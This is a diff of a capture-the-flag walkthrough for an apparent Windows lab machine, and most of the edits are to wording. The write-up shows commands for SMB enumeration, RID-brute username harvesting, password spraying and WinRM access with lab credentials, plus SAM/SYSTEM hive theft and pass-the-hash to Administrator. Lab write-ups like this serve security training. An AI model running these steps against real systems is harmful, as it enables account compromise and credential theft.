@@ -29,6 +29,7 @@ This returns quite a bit of information. We can see that a few ports are open, m
 
 ## Investigating SMB
 We can check SMB by using netexec and smbclient.
+Reference: https://www.netexec.wiki/
 
 ```
 netexec smb <target IP>
@@ -51,13 +52,13 @@ smbclient //<target IP>/HR
 ![HR](Images/HR.png)
 
 We can then retrieve the 'Notice from HR.txt' file by using the get command.
-Back on our attacking machine we can cat the file to read the contents. 
+Back on our attacking machine, cat the file to read the contents. 
 
 ![HRContent](Images/HRContent.png)
 
-Here we can see the default password that is provided to new hires.
+In the output we can see the default password that is provided to new hires.
 
-Now we can use the --rid-brute option in netexec to brute force a list of usernames and output them to a txt file.
+Use the --rid-brute option in netexec to brute force a list of usernames and output them to a txt file.
 
 ```
 netexec smb <target IP> -u 'anonymous' -p '' --rid-brute > user_name_enum.txt
@@ -65,7 +66,7 @@ netexec smb <target IP> -u 'anonymous' -p '' --rid-brute > user_name_enum.txt
 
 ![UserEnum](Images/UserEnum.png)
 
-Clean up the output so that only the text file only contains the usernames.
+Clean up the output so that the text file only contains the usernames.
 Then use netexec to check to see if the default password is still in use by any of the accounts.
 
 ```
@@ -74,7 +75,7 @@ netexec smb <target IP> -u userNames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continu
 ![UserEnumPwd](Images/UserEnumPwd.png)
 
 We can see that the password worked for the user michael.wrightson.
-Next we can check what access Michael has to the available SMB shares.
+Next, we can check what access Michael has to the available SMB shares.
 
 ```
 smbmap -H <target IP> -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
@@ -84,7 +85,8 @@ smbmap -H <target IP> -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
 
 
 Checking the READ ONLY shares we dont find anything of use.
-Next we can try enum4linux to try enumerate more information. Reference: https://github.com/CiscoCXSecurity/enum4linux
+Next we can try enum4linux to try enumerate more information. 
+Reference: https://github.com/CiscoCXSecurity/enum4linux
 
 ```
 enum4linux  -a -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' <target IP>
@@ -115,7 +117,7 @@ The script contains another set of credentials in plaintext.
 ![backupScript](Images/backupScript.png)
 
 ## User Flag
-Try and use evil-winrm with the new user credentials. This works and we can find the flag on the users desktop.
+Use evil-winrm with the new user credentials. This grants us user access to the box and we can find the flag on the users desktop.
 
 ```
 evil-winrm -i <target IP> -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
@@ -140,7 +142,7 @@ download sam
 download system
 ```
 
-Then, we can use impack-secretsdump to dump the sam hashes. With this we can use evil-winrm to pass the hash and connect as Local Admin.
+Next, we can use impack-secretsdump to dump the sam hashes. With this we can use evil-winrm to pass the hash and connect as Administrator.
 From here, navigate to the Desktop to retrieve the root flag.
 
 ```
